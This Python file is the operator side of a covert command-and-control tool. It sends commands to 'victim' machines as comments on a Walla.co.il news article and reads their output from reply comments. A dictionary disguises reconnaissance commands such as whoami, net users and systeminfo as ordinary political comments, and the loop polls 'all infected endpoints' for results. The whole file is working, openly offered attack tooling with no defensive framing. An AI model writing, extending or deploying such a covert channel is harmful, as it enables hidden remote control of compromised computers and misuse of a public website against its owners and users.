# WallaServerSide.py
# 
# This tool is created to communicate unsuspiciously over the internet.
# It sends commands to a victim through the comments of an article in https://Walla.co.il and reads
# the output from the subcomments.
# Dictionary is included if you want to hide the commands with legitimate Israeli comments.
#
# To use it you just need internet connection and the WallaShell.py running on the victim's endpoint.
#
# Author: EdenSha 07/06/2021
# --------------------------------------------------------------------------------------------------------------------

# Imports :
from WallaShell import TIME_TO_SLEEP
import requests
from time import sleep

# globals :
ARTICLE_ID       = "234701" # The shell will run over this article, better check the id exists
GET_COMMENTS_URL = "https://dal.walla.co.il/talkback/list/" + ARTICLE_ID +"?type=1&page=1&from=finance.walla.co.il"
POST_COMMENT_URL = "https://dal.walla.co.il/talkback/?from=finance.walla.co.il"
CMD_POS          = 'content'
WRITER           = 'Ani'
TIME_TO_SLEEP    = 60  # Time to sleep when waiting for results
CMD_DICTIONARY   = {'ipconfig /ALL': 'Rak Bibi',
                    'whoami': 'Right',
                    'arp -a': '0molan',
                    'net users': 'BBZNOT',
                    'route print': 'Am Israel Live',
                    'net localgroup administrators': 'King BiBi', 
                    'systeminfo': 'Make America Great Again'}       



# Send command to Webpage as a comment and return the comment id
def sendCommand(cmd):
    response = requests.post(POST_COMMENT_URL, json={"object-id":ARTICLE_ID,
                                                        "type":1,"writer":WRITER,
                                                        "content": cmd,
                                                        "father-id": 0 })
    print(f"# Command '{0}' Sent to Walla.co.il", cmd)
    print(response)
    
    return response.json()['data']


# Get json of comments from webpage and return a list of command's comments
def getOutput(id):   
    comments = requests.get(GET_COMMENTS_URL)
    json_comments = comments.json()
    output = [cmd for cmd in json_comments['data']['list'] if cmd['id'] == id]

    # Check if there are results 
    if(output):

        # Print all results
        for out in output[0]['children']:
            print(out['writer'] ,out['content'])


def main():
    while(True):
        print("\n\nRecommended commands from our dictionary: \n")
        
        # Print all commands in dictionary
        for i in CMD_DICTIONARY:
            print(i)

        cmd = input("\nEnter here the command you want (exit for exit)--> ")   

        # Check if user asked to exit
        if(cmd.lower() != "exit"):

            # Send command from dictionary if available
            if cmd in CMD_DICTIONARY:
                cmd_id = sendCommand(CMD_DICTIONARY[cmd])
            else:
                cmd_id = sendCommand(cmd)

            for i in range (1,6):
                print(f"Trying to get results... waiting 5 minutes for all infected endpoints {1}/5", i)                
                sleep(TIME_TO_SLEEP)
                getOutput(cmd_id)
        else:
            break
    print("Thank You for Coming!")


if __name__ == "__main__":
    main()